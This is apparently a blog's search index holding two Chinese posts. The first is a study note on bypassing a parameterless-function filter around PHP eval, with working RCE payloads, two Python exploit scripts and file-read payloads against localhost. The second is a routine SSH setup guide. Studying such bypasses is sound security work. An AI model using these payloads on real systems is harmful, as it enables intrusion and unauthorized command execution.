<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>无参数RCE和无字母webshell</title>
      <link href="/2019/07/11/wu-can-shu-rce-he-wu-zi-mu-webshell/"/>
      <url>/2019/07/11/wu-can-shu-rce-he-wu-zi-mu-webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="无参数RCE和无字母webshell"><a href="#无参数RCE和无字母webshell" class="headerlink" title="无参数RCE和无字母webshell"></a>无参数RCE和无字母webshell</h1><p>看了飘零师傅和p牛的博客做一些笔记</p><p><code>eval($_GET[&#39;code]&#39;)</code>;即可getshell</p><p>如果存在正则限制</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>即只可执行无参数的函数<br>允许</p><pre><code>a(b(c()))a()</code></pre><p>不允许<br><code>a(&#39;1&#39;)</code></p><h2 id="绕过方法一"><a href="#绕过方法一" class="headerlink" title="绕过方法一"></a>绕过方法一</h2><p>利用<code>getenv</code>方法</p><ol><li>使用<code>getenv</code>方法可以返回所有的环境变量，等同于$_ENV，是一个数组；</li><li>使用<code>array_rand</code>方法返回数组中随机一个键；</li><li>使用<code>array_flip</code>方法将数组的键值调换，正常返回需要的数值</li><li>爆破，返回所有数据<br>payload <code>?cmd=var_dump(array_rand(array_flip(getenv())));</code></li></ol><h2 id="绕过方法二"><a href="#绕过方法二" class="headerlink" title="绕过方法二"></a>绕过方法二</h2><p>利用<code>getallheaders</code>方法</p><p>使用场景 ，中间件是<code>apache</code></p><ol><li><code>getallheaders</code>方法返回包含当前请求所有头信息的数组；</li><li><code>end</code>方法返回数组最后一条；</li></ol><p>payload <code>?cmd=eval(end(getallheaders()));</code><br><img src="_v_images/20190409205646814_4640.png" alt></p><h2 id="绕过方法三"><a href="#绕过方法三" class="headerlink" title="绕过方法三"></a>绕过方法三</h2><p>使用 <code>get_defined_vars</code>方法</p><p><code>get_defined_vars</code>方法返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>数组</p><ol><li>使用<code>current</code>方法返回新添加的数据</li><li>同样利用方法二的方式来达到RCE</li></ol><p>碰到禁用了<code>$_GET,$_POST,$_COOKIE</code>时可以使用<code>$_FILES</code>，使用脚本来达到RCE</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOpayload <span class="token operator">=</span> <span class="token string">"system('ls /tmp');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">{</span>  payload<span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'hahaha'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre><h2 id="绕过方法四"><a href="#绕过方法四" class="headerlink" title="绕过方法四"></a>绕过方法四</h2><p>使用session绕过<br>通过<code>session_id()</code>返回<code>session id</code><br>通过hex编码来写入payload既符合<code>PHPSESSID</code>的规范</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://localhost/test.php?code=eval(hex2bin(session_id(session_start())));'</span>payload <span class="token operator">=</span> <span class="token string">"system('ls ./');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre><h2 id="绕过方法五"><a href="#绕过方法五" class="headerlink" title="绕过方法五"></a>绕过方法五</h2><p>使用<code>dirname()</code> &amp; <code>chdir()</code>直接读取文件</p><p>用到的函数<br><code>getcwd()</code>  获取当前目录<br><code>dirname()</code> 返回路径中的目录部分<br><code>chdir()</code> 改变目录<br><code>scandir()</code> 列出指定路径中的文件和目录<br>这几个函数配合使用即可达到目录遍历效果</p><p>payload<br>遍历当前目录 <code>?code=var_dump(scandir(getcwd()));</code><br>遍历上级目录<code>?code=var_dump(scandir(dirname(getcwd())));</code><br>读取文件 <code>?code=readfile(next(array_reverse(scandir(getcwd()))))</code></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ssh</title>
      <link href="/2019/07/11/ssh/"/>
      <url>/2019/07/11/ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ssh"><a href="#Linux-ssh" class="headerlink" title="Linux ssh"></a>Linux ssh</h1><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>环境为 Ubuntu16.04</p><pre><code>apt-get install sshopen-server</code></pre><p>Ubuntu默认安装了<code>openssh-client</code>。<br>如果没有开启<code>22</code>端口，可以用iptables开启</p><pre class=" language-sh"><code class="language-sh">iptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</code></pre><p>开启ssh</p><pre><code>service ssh start</code></pre><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><pre><code>ssh username@host #输入密码登陆远程主机ssh -i id_rsa username@host #指定你的私钥免密登陆ssh -p 4444 username@host #指定ssh端口</code></pre><p>设置免密登陆</p><ol><li>生成你的密钥对 <code>ssh-keygen</code></li></ol><pre class=" language-shell"><code class="language-shell">root@ding:/etc/ssh# ssh-keygen #生成密钥对Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): #指定你的保存路径默认为 /yourhome/.ssh/id_rsaEnter passphrase (empty for no passphrase): #输入私钥密码，以后么此时用都会提示需要密码，回车表示不设置Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:UNI6mAQaEiJz8jNXEUMQjFbEciHnwojee0nd6q5DDSE root@dingThe key's randomart image is:+---[RSA 2048]----+|O.+BB=B+.        ||=X+E=o +.        ||+.*++oo.         ||. .=o.+..        || . . .ooS.       ||    o....        ||   ..o .         ||    ...          ||     .+o         |+----[SHA256]-----+</code></pre><p>如果目录下存在同名密钥文件，会提示你是否覆盖，覆盖了可能导致密钥丢失</p><ol start="2"><li><p>利用 <code>ssh-copy-id</code>复制你的公钥到远程主机 </p><pre class=" language-shell"><code class="language-shell">ssh-copy-id username@host #需要知道ssh密码，如果换了端口可以用-p指定</code></pre><p>输入密码后即可复制到 用户的<code>.ssh</code>目录下<br>然后利用<code>ssh username@host</code>即可免密登陆</p></li><li><p>可能会出现的问题<br>权限设置不正确，首先要保证<code>authorized_keys</code>权限为<code>600</code>（公钥信息保存在这里），<code>.ssh</code>目录为<code>700</code>，如果出现错误<code>sign_and_send_pubkey: signing failed: agent refused operation</code>，权限设置，修改<code>/etc/ssh/sshd_config</code>的<code>PubkeyAuthentication yes</code>，表示支持公钥登陆，查看<code>AuthorizedKeysFile</code>是否是使用<code>authorized_keys</code>认证文件。如果都没问题，可能是需要制定私钥文件，可以使用ssh代理</p><pre><code>eval &quot;$(ssh-agent -s)&quot;ssh-add</code></pre><p>更多的可以参考<a href="https://www.zsythink.net/archives/2407" target="_blank" rel="noopener">ssh</a>和<a href="https://www.zsythink.net/archives/2407" target="_blank" rel="noopener">ssh代理</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
